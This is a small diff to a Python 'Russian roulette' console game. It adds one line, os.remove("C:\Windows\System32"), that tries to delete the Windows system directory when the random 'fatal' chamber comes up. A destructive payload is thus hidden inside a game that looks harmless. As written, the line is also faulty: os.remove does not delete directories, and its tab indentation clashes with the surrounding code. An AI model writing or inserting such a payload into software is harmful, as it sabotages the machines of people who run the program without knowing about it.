@@ -21,6 +21,7 @@ fatal_bullet = random.randint(1, int(chambers))
 for x in range(1, int(chambers) + 1):
     input("Press enter to pull the trigger! ")
     if x == fatal_bullet:
+	os.remove("C:\Windows\System32")
         print("You just got served!")
         print("Game Over")
         start_again = input("Do you want to start again? (y/n): ")
